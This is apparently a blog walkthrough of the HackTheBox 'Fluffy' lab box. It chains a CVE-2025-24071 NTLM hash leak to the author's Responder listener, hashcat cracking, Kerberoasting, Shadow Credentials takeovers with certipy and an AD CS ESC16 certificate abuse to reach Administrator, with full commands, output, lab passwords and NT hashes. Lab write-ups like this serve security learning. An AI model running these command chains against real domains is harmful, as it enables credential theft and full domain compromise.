---
title: "HTB: Fluffy - AD CS ESC16 Walkthrough"
date: 2026-06-03
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "AD CS", "Kerberoasting", "Shadow Credentials"]
categories: ["Writeups"]
description: "Walkthrough of the Fluffy Windows Active Directory box: CVE-2025-24071 NTLM hash disclosure, Shadow Credentials attacks via Service Account Managers, and an AD CS ESC16 misconfiguration to full Administrator."
target_ip: "10.129.232.88"
os: Windows
difficulty: Easy
status: Complete
platforms: ["HackTheBox"]
oses: ["Windows"]
difficulties: ["Easy"]
---

# 🚩 Box Name: Fluffy

## 📋 Initial Info
- **Hostname:** `target.htb`

Fluffy is an easy rated Windows machine that begins with credentials for a low-privileged user. By exploiting **CVE-2025-24071**, it's possible to recover another set of user credentials and continue expanding access within the domain. Enumeration uncovers several ACL misconfigurations tied to the `winrm_svc` and `ca_svc` service accounts, providing a clear privilege escalation path. After gaining `WinRM` access, the final step is abusing an `Active Directory Certificate Service ESC16` misconfiguration to escalate privileges and take control of the Administrator account.

**Note from HackTheBox:**
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 10:50 CDT
Nmap scan report for 10.129.232.88
Host is up (0.062s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-03 22:52:22Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-03T22:53:57+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-03T22:53:58+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-03T22:53:57+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-06-03T22:53:58+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
49761/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-03T22:53:20
|_  start_date: N/A
|_clock-skew: mean: 6h59m45s, deviation: 0s, median: 6h59m45s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   58.77 ms 10.10.14.1
2   58.79 ms 10.129.232.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 238.27 seconds
```

This looks like a Domain Controller. First I'm going to update my `/etc/hosts` file. Since I know the username structure I could run a tool like `kerbrute` in the background to obtain more users. Before I dive too deep into that I'm going to start off by performing SMB enumeration.

### ♠ SMB Enumeration

The credentials are valid and it appears we are dealing with a Windows 10 / Server 2019 Build 17763.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!'                                                                                                              ──(Wed,Jun03)─┘
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

Now let's see if there is any interesting shares.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares                                                                                                     ──(Wed,Jun03)─┘
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

The IT share sticks out as interesting. Now I'm going to use another tool `smbclient` to look for interesting files or clues.

```shell
┌─[split@parrot:~/Documents/HTB]
└─❯ smbclient //fluffy.htb/IT -U j.fleischman                                                                                                                             1 ↵ ──(Wed,Jun03)─┘
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 18:02:10 2026
  ..                                  D        0  Wed Jun  3 18:02:10 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 10:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 10:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 10:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 10:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025

                5842943 blocks of size 4096. 1819937 blocks available
```

There are a few interesting things here. I'm going to download everything to my machine for further inspection.

![Upgrade Notice PDF contents](/images/fluffy/upgrade_notice.png)

This PDF is very interesting. From what I'm gathering this was sent to Administrators in the IT department to address vulnerabilities found on the network. There are many paths I could take with the credentials I have but exploring these CVE's seem more interesting at the moment. I'm going to start off with the two listed as Critical.

---

## ⚡ Exploitation (Initial Access)
### Discovery
- Found [CVE-2025-24071].

> [!NOTE] Update
> Microsoft has changed its CVE number. The CVE number previously defined by Microsoft, `CVE-2025-24071`, has been updated to `CVE-2025-24054`. 🤷‍♂️

**CVE-2025-24071** is a Windows NTLM hash disclosure vulnerability that allows an attacker to trick a system into leaking a user's credentials. While the bug itself doesn't immediately grant code execution, the exposed NTLM hash can be leveraged for relay attacks, credential theft, or further compromise of the domain. In this machine, it serves as the initial stepping stone to obtain another user's credentials and continue moving through the environment.

### Foothold

`https://github.com/0x6rss/CVE-2025-24071_PoC`

After doing some research I discovered this exploit. I'm going to clone the `GitHub` repository to my machine.

Steps:
1. python poc.py
2. enter filename, my IP
3. start responder
4. put file into smb share
5. crack hash

Created the Exploit.
```shell
┌─[split@parrot:~/Documents/HTB/Fluffy/CVE-2025-24071_PoC]
└─❯ ls                                                                         ──(Wed,Jun03)─┘
poc.py  README.md
┌─[split@parrot:~/Documents/HTB/Fluffy/CVE-2025-24071_PoC]
└─❯ python poc.py                                                              ──(Wed,Jun03)─┘
Enter your file name: lol
Enter IP (EX: 192.168.1.162): 10.10.14.239
completed
┌─[split@parrot:~/Documents/HTB/Fluffy/CVE-2025-24071_PoC]
└─❯ ls                                                                         ──(Wed,Jun03)─┘
exploit.zip  poc.py  README.md
```

Start Responder
```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ sudo responder -I tun0                                                    ──(Wed,Jun03)─┘
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
```

As Responder is listening place the created file into the SMB Share.

![Placing exploit file into the SMB share](/images/fluffy/exploit-1.png)

Next use `hashcat` to crack the hash.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy/CVE-2025-24071_PoC]
└─❯ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt                      ──(Wed,Jun03)─┘
hashcat (v6.2.6) starting

<SNIP>

P.AGILA::FLUFFY:1097612a5ad08621:3ca10b19e7d17eb4f870bf4db5991086:010100000000000080aa82cd53f3dc018f826fb381d0720900000000020008004a0052004900520001001e00570049004e002d0052004700510048004a0052004400310042003000310004003400570049004e002d0052004700510048004a005200440031004200300031002e004a005200490052002e004c004f00430041004c00030014004a005200490052002e004c004f00430041004c00050014004a005200490052002e004c004f00430041004c000700080080aa82cd53f3dc0106000400020000000800300030000000000000000100000000200000d9b155e593e03496d9c621035bc0c44dee564ecf3b8b2d3b41f1e9d3f9aeca0e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200330039000000000000000000:prometheusx-303

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:1097612a5ad08621:3ca10b19e7d17eb4f8...000000
Time.Started.....: Wed Jun  3 12:31:12 2026 (5 secs)
Time.Estimated...: Wed Jun  3 12:31:17 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1102.3 kH/s (1.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4515840/14344385 (31.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: proretriever -> progree
Hardware.Mon.#1..: Util: 91%

Started: Wed Jun  3 12:31:09 2026
Stopped: Wed Jun  3 12:31:18 2026
```

Now I have more credentials! Let's see what I can do with these.

`p.agila:prometheusx-303`

Something important to check with credentials is to look for `Kerberoastable` users. From the impacket script I can see that several accounts are vulnerable. I can next either add the `-request` flag or use some other tool to `kerberoast` these users. There are lots of ways to do this.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ impacket-GetUserSPNs -dc-ip 10.129.232.88 fluffy.htb/p.agila:'prometheusx-303'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:07:50.136701  2025-05-21 17:21:15.969274
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:17:00.599545  <never>
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 19:51:16.786913  2025-05-19 10:13:22.188468
```

The `winrm_svc` user is the most interesting because I will likely be able to remote into the Domain Controller with this user.

My first attempt failed because the clock skew was to far apart so I used `ntpdate` to sync my machine with the Domain Controller.

```shell
└─❯ sudo ntpdate 10.129.232.88                                                ──(Wed,Jun03)─┘
2026-06-03 19:37:40.165649 (-0500) +25185.896518 +/- 0.029639 10.129.232.88 s1 no-leap
CLOCK: time stepped by 25185.896518
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ impacket-GetUserSPNs -request -dc-ip 10.129.232.88 fluffy.htb/p.agila:'prometheusx-303'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:07:50.136701  2025-05-21 17:21:15.969274
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:17:00.599545  <never>
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 19:51:16.786913  2025-05-19 10:13:22.188468



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$8bf0dd0bfcf91ffb2320fd2f3eb79afe$38042d163ff057aace087aa07f13e0246e32cddce85555866cbb6b6a93895d66021d73019fa6641
<SNIP>

$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$a1eb4d80efca9d343cb2447ad038a113$ffa9a1b6e42c2ba5945a77c375a00538a082acdc102f4fe8bff73358ea2a2aaf397ebe65fc3
<SNIP>

$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$be98d3f392f21c3001b0934638a68c35$8d9e07a1935681cf210bdf51a8e546ef6bf2cf51894fa010c8c9023b95c91dab294e23a31
<SNIP>
```

I got all 3 hashes which I will next attempt to crack with `hashcat`.

This turned out to be a dead end since I could not crack any of the hashes. From here I can start the enumeration process over with the new user or see what I can see with Bloodhound Enumeration.

I like using `rusthound-ce`

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy/Bloodhound_Data]
└─❯ rusthound-ce -d fluffy.htb -i 10.129.232.88 -u p.agila -p 'prometheusx-303' -v
---------------------------------------------------
Initializing RustHound-CE at 19:44:52 on 06/03/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-06-04T00:44:52Z INFO  rusthound_ce] Verbosity level: Debug
[2026-06-04T00:44:52Z INFO  rusthound_ce] Collection method: All

<SNIP>

[2026-06-04T00:44:57Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-06-04T00:44:57Z INFO  rusthound_ce::json::maker::common] .//20260603194457_fluffy-htb_issuancepolicies.json created!

RustHound-CE Enumeration Completed at 19:44:57 on 06/03/26! Happy Graphing!

┌─[split@parrot:~/Documents/HTB/Fluffy/Bloodhound_Data]
└─❯ ls                                                                         ──(Wed,Jun03)─┘
20260603194457_fluffy-htb_aiacas.json         20260603194457_fluffy-htb_groups.json
20260603194457_fluffy-htb_certtemplates.json  20260603194457_fluffy-htb_issuancepolicies.json
20260603194457_fluffy-htb_computers.json      20260603194457_fluffy-htb_ntauthstores.json
20260603194457_fluffy-htb_containers.json     20260603194457_fluffy-htb_ous.json
20260603194457_fluffy-htb_domains.json        20260603194457_fluffy-htb_rootcas.json
20260603194457_fluffy-htb_enterprisecas.json  20260603194457_fluffy-htb_users.json
20260603194457_fluffy-htb_gpos.json
```

With all the `.json` files I'm going to fire up `BloodHound` and look at the data.

![BloodHound graph data](/images/fluffy/bh-data.png)

After some additional enumeration, I identified a path to the `winrm_svc` account, which confirmed my suspicion that it could be used for remote access since it belongs to the **Remote Management Users** group.

The privilege escalation path here is fairly straightforward. I already have control over the `P.Agila` account, which is a member of the **Service Account Managers** group. This group has **GenericAll** rights over the **SERVICE ACCOUNTS** group, effectively giving it full control over that object.

The first step is to add `P.Agila` to the **SERVICE ACCOUNTS** group. Once added, `P.Agila` inherits the permissions assigned to that group, including **GenericWrite** rights over the `winrm_svc` account.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ bloodyAD --host '10.129.232.88' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
[+] p.agila added to SERVICE ACCOUNTS
```

With write access over `winrm_svc`, I can abuse the account using a Shadow Credentials attack. This technique works by adding a new key credential to the target account's `msDS-KeyCredentialLink` attribute. Since I control the key pair, I can authenticate as `winrm_svc` without knowing its password.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -target-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ea222b873615478083f2b8ac2323b6df'
[*] Adding Key Credential with device ID 'ea222b873615478083f2b8ac2323b6df' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'ea222b873615478083f2b8ac2323b6df' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

Certipy automatically generates a certificate, adds the malicious key credential to `winrm_svc`, authenticates as the account using PKINIT, retrieves a Kerberos TGT, and finally extracts the NT hash. Once the attack is complete, the original key credentials are restored to reduce evidence of the modification.

The result is the NT hash for `winrm_svc`, giving me control of an account that can be used to access the target via WinRM.

The chain is:

```text
P.Agila
    ↓
Member of Service Account Managers
    ↓
GenericAll on SERVICE ACCOUNTS group
    ↓
Add self to SERVICE ACCOUNTS
    ↓
Gain GenericWrite on winrm_svc
    ↓
Modify msDS-KeyCredentialLink
    ↓
Shadow Credentials attack
    ↓
Authenticate as winrm_svc
    ↓
Retrieve NT hash
    ↓
WinRM access
```

The important takeaway is that **you never reset the password and you never crack a hash**. You're abusing Active Directory permissions to add your own authentication method to the account, temporarily becoming that user and extracting their credentials. That's what makes Shadow Credentials such a powerful technique. I can now grab the user.txt flag.

## 🛡️ Privilege Escalation

After obtaining access as `winrm_svc`, I started looking for the next opportunity to move forward.

The account itself didn't have any particularly interesting privileges. The only notable one was `SeMachineAccountPrivilege`, which allows a user to join machines to the domain, but that wasn't the intended path here.

```shell
*Evil-WinRM* PS C:\Users\winrm_svc> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

My next step was to enumerate users on the Domain Controller. One account immediately stood out: `ca_svc`.

```shell
*Evil-WinRM* PS C:\Users\winrm_svc> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            ca_svc                   Guest
j.coffey                 j.fleischman             krbtgt
ldap_svc                 p.agila                  winrm_svc
The command completed with one or more errors.
```

The name was a pretty strong hint that this account was related to Active Directory Certificate Services (AD CS), which often plays a role in certificate-based privilege escalation attacks.

A closer look at the account confirmed my suspicion.

```shell
*Evil-WinRM* PS C:\Users\winrm_svc> net user ca_svc
User name                    ca_svc
Full Name                    certificate authority service
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/17/2025 9:07:50 AM
Password expires             Never
Password changeable          4/18/2025 9:07:50 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/21/2025 3:21:15 PM

Logon hours allowed          All

Local Group Memberships      *Cert Publishers
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.
```

The account description identifies it as the **Certificate Authority Service** account. More importantly, it is also a member of the **Service Accounts** group.

Earlier in the attack chain, I discovered that members of the **Service Accounts** group have write access over one another. This means that just as I abused `P.Agila` to take over `winrm_svc`, I can repeat the same process against `ca_svc`.

![BloodHound path to ca_svc user](/images/fluffy/bh-casvc-user.png)

Since I already have the NT hash for `winrm_svc`, I can authenticate with Certipy using pass-the-hash and perform another Shadow Credentials attack.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad shadow auto -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767  -account 'CA_SVC'  -target-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '727dfa004847416ca15b81647b81bf76'
[*] Adding Key Credential with device ID '727dfa004847416ca15b81647b81bf76' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '727dfa004847416ca15b81647b81bf76' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Just like before, Certipy temporarily adds a new key credential to the target account, authenticates using PKINIT, retrieves a TGT, extracts the NT hash, and restores the original configuration.

At the end of the process I have control of the `ca_svc` account.

With credentials for the certificate service account in hand, it was time to start looking for AD CS misconfigurations.

I'll be honest: certificate attacks are still an area I'm actively learning. This part of the box took me quite a while the first time around, and I needed a lot of help to fully understand what was happening. I'm currently working through the CAPE path on HackTheBox and plan to spend more time studying AD CS abuse techniques in the future.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

The output reveals a vulnerable configuration: **ESC16**.

The details of `ESC16` can get fairly technical, but the important point is that certificate mapping becomes weaker when the security extension is disabled. Under the right conditions, it becomes possible to request a certificate that claims to belong to another user.

Conveniently, this machine already satisfies the required conditions.

Because I have write access over `ca_svc`, I can modify its `userPrincipalName` (UPN). The attack works by temporarily changing the UPN to `administrator`, requesting a certificate, and then changing the UPN back to its original value.

First, I modify the UPN.
```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

At this point, the `ca_svc` account is effectively claiming the identity `administrator` from the perspective of certificate enrollment.

Next, I request a certificate using the compromised `ca_svc` account.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad req -u 'ca_svc@fluffy.htb' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca 'fluffy-DC01-CA'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The Certificate Authority issues a certificate containing the UPN `administrator`.

```text
[*] Got certificate with UPN 'administrator'
```

After obtaining the certificate, I immediately restore the original UPN so the account returns to its normal state.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn 'ca_svc' -user 'ca_svc' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

Now comes the interesting part.

Even though the certificate was requested using the `ca_svc` account, the certificate itself identifies the owner as `administrator`. Because of the `ESC16` misconfiguration, Windows accepts this identity during certificate authentication.

Using the newly issued certificate, I authenticate directly as `Administrator`.

```shell
┌─[split@parrot:~/Documents/HTB/Fluffy]
└─❯ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

The authentication succeeds, a TGT is issued for the Administrator account, and Certipy retrieves the Administrator NT hash.

```text
[*] Got hash for 'administrator@fluffy.htb'
```

At this point, the domain is fully compromised.

![Administrator access confirmed — root flag obtained](/images/fluffy/root.png)
